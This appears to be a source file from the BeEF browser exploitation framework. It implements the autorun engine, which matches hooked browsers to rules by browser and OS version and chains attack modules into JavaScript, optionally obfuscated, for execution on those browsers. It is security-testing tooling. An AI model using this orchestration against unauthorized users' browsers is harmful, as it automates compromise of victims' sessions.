#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module AutorunEngine
      class Engine
        include Singleton

        def initialize
          @config = BeEF::Core::Configuration.instance

          @result_poll_interval = @config.get('beef.autorun.result_poll_interval')
          @result_poll_timeout = @config.get('beef.autorun.result_poll_timeout')
          @continue_after_timeout = @config.get('beef.autorun.continue_after_timeout')

          @debug_on = @config.get('beef.debug')

          @VERSION = ['<', '<=', '==', '>=', '>', 'ALL']
          @VERSION_STR = %w[XP Vista 7]
        end

        # Checks if there are any ARE rules to be triggered for the specified hooked browser.
        #
        # Returns an array with rule IDs that matched and should be triggered.
        # if rule_id is specified, checks will be executed only against the specified rule (useful
        #  for dynamic triggering of new rulesets ar runtime)
        def find_matching_rules_for_zombie(browser, browser_version, os, os_version)
          rules = BeEF::Core::Models::Rule.all

          return if rules.nil?
          return if rules.empty?

          # TODO: handle cases where there are multiple ARE rules for the same hooked browser.
          # maybe rules need to have priority or something?

          print_info '[ARE] Checking if any defined rules should be triggered on target.'

          match_rules = []
          rules.each do |rule|
            next unless zombie_matches_rule?(browser, browser_version, os, os_version, rule)

            match_rules.push(rule.id)
            print_more("Hooked browser and OS match rule: #{rule.name}.")
          end

          print_more("Found [#{match_rules.length}/#{rules.length}] ARE rules matching the hooked browser.")

          match_rules
        end

        # @return [Boolean]
        # Note: browser version checks are supporting only major versions, ex: C 43, IE 11
        # Note: OS version checks are supporting major/minor versions, ex: OSX 10.10, Windows 8.1
        def zombie_matches_rule?(browser, browser_version, os, os_version, rule)
          return false if rule.nil?

          unless zombie_browser_matches_rule?(browser, browser_version, rule)
            print_debug("Browser version check -> (hook) #{browser_version} #{rule.browser_version} (rule) : does not match")
            return false
          end

          print_debug("Browser version check -> (hook) #{browser_version} #{rule.browser_version} (rule) : matched")

          unless zombie_os_matches_rule?(os, os_version, rule)
            print_debug("OS version check -> (hook) #{os_version} #{rule.os_version} (rule): does not match")
            return false
          end

          print_debug("OS version check -> (hook) #{os_version} #{rule.os_version} (rule): matched")

          true
        rescue StandardError => e
          print_error e.message
          print_debug e.backtrace.join("\n")
        end

        # @return [Boolean]
        # TODO: This should be updated to support matching multiple OS (like the browser check below)
        def zombie_os_matches_rule?(os, os_version, rule)
          return false if rule.nil?

          return false unless rule.os == 'ALL' || os == rule.os

          # check if the OS versions match
          os_ver_rule_cond = rule.os_version.split(' ').first

          return true if os_ver_rule_cond == 'ALL'

          return false unless @VERSION.include?(os_ver_rule_cond) || @VERSION_STR.include?(os_ver_rule_cond)

          os_ver_rule_maj = rule.os_version.split(' ').last.split('.').first
          os_ver_rule_min = rule.os_version.split(' ').last.split('.').last

          if os_ver_rule_maj == 'XP'
            os_ver_rule_maj = 5
            os_ver_rule_min = 0
          elsif os_ver_rule_maj == 'Vista'
            os_ver_rule_maj = 6
            os_ver_rule_min = 0
          elsif os_ver_rule_maj == '7'
            os_ver_rule_maj = 6
            os_ver_rule_min = 0
          end

          # Most of the times Linux/*BSD OS doesn't return any version
          # (TODO: improve OS detection on these operating systems)
          if !os_version.nil? && !@VERSION_STR.include?(os_version)
            os_ver_hook_maj = os_version.split('.').first
            os_ver_hook_min = os_version.split('.').last

            # the following assignments to 0 are need for later checks like:
            # 8.1 >= 7, because if the version doesn't have minor versions, maj/min are the same
            os_ver_hook_min = 0 if os_version.split('.').length == 1
            os_ver_rule_min = 0 if rule.os_version.split('.').length == 1
          else
            # XP is Windows 5.0 and Vista is Windows 6.0. Easier for comparison later on.
            # TODO: BUG: This will fail horribly if the target OS is Windows 7 or newer,
            # as no version normalization is performed.
            # TODO: Update this for every OS since Vista/7 ...
            if os_version == 'XP'
              os_ver_hook_maj = 5
              os_ver_hook_min = 0
            elsif os_version == 'Vista'
              os_ver_hook_maj = 6
              os_ver_hook_min = 0
            elsif os_version == '7'
              os_ver_hook_maj = 6
              os_ver_hook_min = 0
            end
          end

          if !os_version.nil? || rule.os_version != 'ALL'
            os_major_version_match = compare_versions(os_ver_hook_maj.to_s, os_ver_rule_cond, os_ver_rule_maj.to_s)
            os_minor_version_match = compare_versions(os_ver_hook_min.to_s, os_ver_rule_cond, os_ver_rule_min.to_s)
            return false unless (os_major_version_match && os_minor_version_match)
          end

          true
        rescue StandardError => e
          print_error e.message
          print_debug e.backtrace.join("\n")
        end

        # @return [Boolean]
        def zombie_browser_matches_rule?(browser, browser_version, rule)
          return false if rule.nil?

          b_ver_cond = rule.browser_version.split(' ').first

          return false unless @VERSION.include?(b_ver_cond)

          b_ver = rule.browser_version.split(' ').last

          return false unless BeEF::Filters.is_valid_browserversion?(b_ver)

          # check if rule specifies multiple browsers
          if rule.browser =~ /\A[A-Z]+\Z/
              return false unless rule.browser == 'ALL' || browser == rule.browser

              # check if the browser version matches
              browser_version_match = compare_versions(browser_version.to_s, b_ver_cond, b_ver.to_s)
              return false unless browser_version_match
            else
              browser_match = false
              rule.browser.gsub(/[^A-Z,]/i, '').split(',').each do |b|
                if b == browser || b == 'ALL'
                  browser_match = true
                  break
                end
              end
              return false unless browser_match
          end

          true
        rescue StandardError => e
          print_error e.message
          print_debug e.backtrace.join("\n")
        end

        # Check if the hooked browser type/version and OS type/version match any Rule-sets
        # stored in the BeEF::Core::Models::Rule database table
        # If one or more Rule-sets do match, trigger the module chain specified
        def find_and_run_all_matching_rules_for_zombie(hb_id)
          return if hb_id.nil?

          hb_details = BeEF::Core::Models::BrowserDetails
          browser_name = hb_details.get(hb_id, 'browser.name')
          browser_version = hb_details.get(hb_id, 'browser.version')
          os_name = hb_details.get(hb_id, 'host.os.name')
          os_version = hb_details.get(hb_id, 'host.os.version')

          are = BeEF::Core::AutorunEngine::Engine.instance
          rules = are.find_matching_rules_for_zombie(browser_name, browser_version, os_name, os_version)

          return if rules.nil?
          return if rules.empty?

          are.run_rules_on_zombie(rules, hb_id)
        end

        # Run the specified rule IDs on the specified zombie ID
        # only if the rules match.
        def run_matching_rules_on_zombie(rule_ids, hb_id)
          return if rule_ids.nil?
          return if hb_id.nil?

          rule_ids = [rule_ids.to_i] if rule_ids.is_a?(String)

          hb_details = BeEF::Core::Models::BrowserDetails
          browser_name = hb_details.get(hb_id, 'browser.name')
          browser_version = hb_details.get(hb_id, 'browser.version')
          os_name = hb_details.get(hb_id, 'host.os.name')
          os_version = hb_details.get(hb_id, 'host.os.version')

          are = BeEF::Core::AutorunEngine::Engine.instance
          rules = are.find_matching_rules_for_zombie(browser_name, browser_version, os_name, os_version)

          return if rules.nil?
          return if rules.empty?

          new_rules = []
          rules.each do |rule|
            new_rules << rule if rule_ids.include?(rule)
          end

          return if new_rules.empty?

          are.run_rules_on_zombie(new_rules, hb_id)
        end

        # Run the specified rule IDs on the specified zombie ID
        # regardless of whether the rules match.
        # Prepare and return the JavaScript of the modules to be sent.
        # It also updates the rules ARE execution table with timings
        def run_rules_on_zombie(rule_ids, hb_id)
          return if rule_ids.nil?
          return if hb_id.nil?

          hb = BeEF::HBManager.get_by_id(hb_id)
          hb_session = hb.session

          rule_ids = [rule_ids] if rule_ids.is_a?(Integer)

          rule_ids.each do |rule_id|
            rule = BeEF::Core::Models::Rule.find(rule_id)
            modules = JSON.parse(rule.modules)

            execution_order = JSON.parse(rule.execution_order)
            execution_delay = JSON.parse(rule.execution_delay)
            chain_mode = rule.chain_mode

            unless %w[sequential nested-forward].include?(chain_mode)
              print_error("[ARE] Invalid chain mode '#{chain_mode}' for rule")
              return
            end

            mods_bodies = []
            mods_codes = []
            mods_conditions = []

            # this ensures that if both rule A and rule B call the same module in sequential mode,
            # execution will be correct preventing wrapper functions to be called with equal names.
            rule_token = SecureRandom.hex(5)

            modules.each do |cmd_mod|
              mod = BeEF::Core::Models::CommandModule.where(name: cmd_mod['name']).first
              options = []
              replace_input = false
              cmd_mod['options'].each do |k, v|
                options.push({ 'name' => k, 'value' => v })
                replace_input = true if v == '<<mod_input>>'
              end

              command_body = prepare_command(mod, options, hb_id, replace_input, rule_token)

              mods_bodies.push(command_body)
              mods_codes.push(cmd_mod['code'])
              mods_conditions.push(cmd_mod['condition'])
            end

            # Depending on the chosen chain mode (sequential or nested/forward), prepare the appropriate wrapper
            case chain_mode
            when 'nested-forward'
              wrapper = prepare_nested_forward_wrapper(mods_bodies, mods_codes, mods_conditions, execution_order, rule_token)
            when 'sequential'
              wrapper = prepare_sequential_wrapper(mods_bodies, execution_order, execution_delay, rule_token)
            else
              # we should never get here. chain mode is validated earlier.
              print_error("[ARE] Invalid chain mode '#{chain_mode}'")
              next
            end

            print_more "Triggering rules #{rule_ids} on HB #{hb_id}"

            are_exec = BeEF::Core::Models::Execution.new(
              session_id: hb_session,
              mod_count: modules.length,
              mod_successful: 0,
              rule_token: rule_token,
              mod_body: wrapper,
              is_sent: false,
              rule_id: rule_id
            )
            are_exec.save!
          end
        end

        private

        # Wraps module bodies in their own function, using setTimeout to trigger them with an eventual delay.
        # Launch order is also taken care of.
        #  - sequential chain with delays (setTimeout stuff)
        #    ex.: setTimeout(module_one(),   0);
        #         setTimeout(module_two(),   2000);
        #         setTimeout(module_three(), 3000);
        # Note: no result status is checked here!! Useful if you just want to launch a bunch of modules without caring
        #  what their status will be (for instance, a bunch of XSRFs on a set of targets)
        def prepare_sequential_wrapper(mods, order, delay, rule_token)
          wrapper = ''
          delayed_exec = ''
          c = 0
          while c < mods.length
            delayed_exec += %| setTimeout(function(){#{mods[order[c]][:mod_name]}_#{rule_token}();}, #{delay[c]}); |
            mod_body = mods[order[c]][:mod_body].to_s.gsub("#{mods[order[c]][:mod_name]}_mod_output", "#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output")
            wrapped_mod = "#{mod_body}\n"
            wrapper += wrapped_mod
            c += 1
          end
          wrapper += delayed_exec
          print_more "Final Modules Wrapper:\n #{wrapper}" if @debug_on
          wrapper
        end

        # Wraps module bodies in their own function, then start to execute them from the first, polling for
        # command execution status/results (with configurable polling interval and timeout).
        # Launch order is also taken care of.
        #  - nested forward chain with status checks (setInterval to wait for command to return from async operations)
        #    ex.:  module_one()
        #           if condition
        #             module_two(module_one_output)
        #               if condition
        #                  module_three(module_two_output)
        #
        # Note: command result status is checked, and you can properly chain input into output, having also
        # the flexibility of slightly mangling it to adapt to module needs.
        # Note: Useful in situations where you want to launch 2 modules, where the second one will execute only
        #     if the first once return with success. Also, the second module has the possibility of mangling first
        #     module output and use it as input for some of its module inputs.
        def prepare_nested_forward_wrapper(mods, code, conditions, order, rule_token)
          wrapper = ''
          delayed_exec = ''
          delayed_exec_footers = []
          c = 0

          while c < mods.length
            i = if mods.length == 1
                  c
                else
                  c + 1
                end

            code_snippet = ''
            mod_input = ''
            if code[c] != 'null' && code[c] != ''
              code_snippet = code[c]
              mod_input = 'mod_input'
            end

            conditions[i] = true if conditions[i].nil? || conditions[i] == ''

            if c == 0
              # this is the first wrapper to prepare
              delayed_exec += %|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  #{mods[order[c]][:mod_name]}_#{rule_token}();

                  // TODO add timeout to prevent infinite loops
                  function isResReady(mod_result, start){
                    if (mod_result === null && parseInt(((new Date().getTime()) - start)) < #{@result_poll_timeout}){
                       // loop
                    }else{
                       // module return status/data is now available
                       clearInterval(resultReady);
                          if (mod_result === null && #{@continue_after_timeout}){
                              var mod_result = [];
                              mod_result[0] = 1; //unknown status
                              mod_result[1] = '' //empty result
                          }
                          var status = mod_result[0];
                       if(#{conditions[i]}){
                         #{mods[order[i]][:mod_name]}_#{rule_token}_can_exec = true;
                         #{mods[order[c]][:mod_name]}_#{rule_token}_mod_output = mod_result[1];
              |

              delayed_exec_footer = %|
                     }
                    }
                  }
                  var start = (new Date()).getTime();
                  var resultReady = setInterval(function(){var start = (new Date()).getTime(); isResReady(#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output, start);},#{@result_poll_interval});
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |

              delayed_exec_footers.push(delayed_exec_footer)

            elsif c < mods.length - 1
              code_snippet = code_snippet.to_s.gsub(mods[order[c - 1]][:mod_name], "#{mods[order[c - 1]][:mod_name]}_#{rule_token}")

              # this is one of the wrappers in the middle of the chain
              delayed_exec += %|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  if(#{mods[order[c]][:mod_name]}_#{rule_token}_can_exec){
                     #{code_snippet}
                     #{mods[order[c]][:mod_name]}_#{rule_token}(#{mod_input});
                     function isResReady(mod_result, start){
                        if (mod_result === null && parseInt(((new Date().getTime()) - start)) < #{@result_poll_timeout}){
                           // loop
                        }else{
                           // module return status/data is now available
                         clearInterval(resultReady);
                          if (mod_result === null && #{@continue_after_timeout}){
                              var mod_result = [];
                              mod_result[0] = 1; //unknown status
                              mod_result[1] = '' //empty result
                          }
                          var status = mod_result[0];
                          if(#{conditions[i]}){
                             #{mods[order[i]][:mod_name]}_#{rule_token}_can_exec = true;
                             #{mods[order[c]][:mod_name]}_#{rule_token}_mod_output = mod_result[1];
              |

              delayed_exec_footer = %|
                         }
                       }
                     }
                     var start = (new Date()).getTime();
                     var resultReady = setInterval(function(){ isResReady(#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output, start);},#{@result_poll_interval});
                  }
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |

              delayed_exec_footers.push(delayed_exec_footer)
            else
              code_snippet = code_snippet.to_s.gsub(mods[order[c - 1]][:mod_name], "#{mods[order[c - 1]][:mod_name]}_#{rule_token}")
              # this is the last wrapper to prepare
              delayed_exec += %|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  if(#{mods[order[c]][:mod_name]}_#{rule_token}_can_exec){
                     #{code_snippet}
                     #{mods[order[c]][:mod_name]}_#{rule_token}(#{mod_input});
                  }
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |
            end
            mod_body = mods[order[c]][:mod_body].to_s.gsub("#{mods[order[c]][:mod_name]}_mod_output", "#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output")
            wrapped_mod = "#{mod_body}\n"
            wrapper += wrapped_mod
            c += 1
          end
          wrapper += delayed_exec + delayed_exec_footers.reverse.join("\n")
          print_more "Final Modules Wrapper:\n #{delayed_exec + delayed_exec_footers.reverse.join("\n")}" if @debug_on
          wrapper
        end

        # prepare the command module (compiling the Erubis templating stuff), eventually obfuscate it,
        # and store it in the database.
        # Returns the raw module body after template substitution.
        def prepare_command(mod, options, hb_id, replace_input, rule_token)
          config = BeEF::Core::Configuration.instance
          begin
            command = BeEF::Core::Models::Command.new(
              data: options.to_json,
              hooked_browser_id: hb_id,
              command_module_id: BeEF::Core::Configuration.instance.get("beef.module.#{mod.name}.db.id"),
              creationdate: Time.new.to_i,
              instructions_sent: true
            )
            command.save!

            command_module = BeEF::Core::Models::CommandModule.find(mod.id)
            if command_module.path.match(/^Dynamic/)
              # metasploit and similar integrations
              command_module = BeEF::Modules::Commands.const_get(command_module.path.split('/').last.capitalize).new
            else
              # normal modules always here
              key = BeEF::Module.get_key_by_database_id(mod.id)
              command_module = BeEF::Core::Command.const_get(config.get("beef.module.#{key}.class")).new(key)
            end

            hb = BeEF::HBManager.get_by_id(hb_id)
            hb_session = hb.session
            command_module.command_id = command.id
            command_module.session_id = hb_session
            command_module.build_datastore(command.data)
            command_module.pre_send

            build_missing_beefjs_components(command_module.beefjs_components) unless command_module.beefjs_components.empty?

            if config.get('beef.extension.evasion.enable')
              evasion = BeEF::Extension::Evasion::Evasion.instance
              command_body = evasion.obfuscate(command_module.output) + "\n\n"
            else
              command_body = command_module.output + "\n\n"
            end

            # @note prints the event to the console
            print_more "Preparing JS for command id [#{command.id}], module [#{mod.name}]"

            mod_input = replace_input ? 'mod_input' : ''
            result = %|
                var #{mod.name}_#{rule_token} = function(#{mod_input}){
                    #{clean_command_body(command_body, replace_input)}
                };
                var #{mod.name}_#{rule_token}_can_exec = false;
                var #{mod.name}_#{rule_token}_mod_output = null;
            |

            { mod_name: mod.name, mod_body: result }
          rescue StandardError => e
            print_error e.message
            print_debug e.backtrace.join("\n")
          end
        end

        # Removes the beef.execute wrapper in order that modules are executed in the ARE wrapper, rather than
        # using the default behavior of adding the module to an array and execute it at polling time.
        #
        # Also replace <<mod_input>> with mod_input variable if needed for chaining module output/input
        def clean_command_body(command_body, replace_input)
          cmd_body = command_body.lines.map(&:chomp)
          wrapper_start_index, wrapper_end_index = nil

          cmd_body.each_with_index do |line, index|
            if line.to_s =~ /^(beef|[a-zA-Z]+)\.execute\(function\(\)/
              wrapper_start_index = index
              break
            end
          end
          print_error '[ARE] Could not find module start index' if wrapper_start_index.nil?

          cmd_body.reverse.each_with_index do |line, index|
            if line.include?('});')
              wrapper_end_index = index
              break
            end
          end
          print_error '[ARE] Could not find module end index' if wrapper_end_index.nil?

          cleaned_cmd_body = cmd_body.slice(wrapper_start_index..-(wrapper_end_index + 1)).join("\n")

          print_error '[ARE] No command to send' if cleaned_cmd_body.eql?('')

          # check if <<mod_input>> should be replaced with a variable name (depending if the variable is a string or number)
          return cleaned_cmd_body unless replace_input

          if cleaned_cmd_body.include?('"<<mod_input>>"')
            cleaned_cmd_body.gsub('"<<mod_input>>"', 'mod_input')
          elsif cleaned_cmd_body.include?('\'<<mod_input>>\'')
            cleaned_cmd_body.gsub('\'<<mod_input>>\'', 'mod_input')
          elsif cleaned_cmd_body.include?('<<mod_input>>')
            cleaned_cmd_body.gsub('\'<<mod_input>>\'', 'mod_input')
          else
            cleaned_cmd_body
          end
        rescue StandardError => e
          print_error "[ARE] There is likely a problem with the module's command.js parsing. Check Engine.clean_command_body. #{e.message}"
        end

        # compare versions
        def compare_versions(ver_a, cond, ver_b)
          return true if cond == 'ALL'
          return true if cond == '==' && ver_a == ver_b
          return true if cond == '<=' && ver_a <= ver_b
          return true if cond == '<'  && ver_a <  ver_b
          return true if cond == '>=' && ver_a >= ver_b
          return true if cond == '>'  && ver_a >  ver_b

          false
        end
      end
    end
  end
end
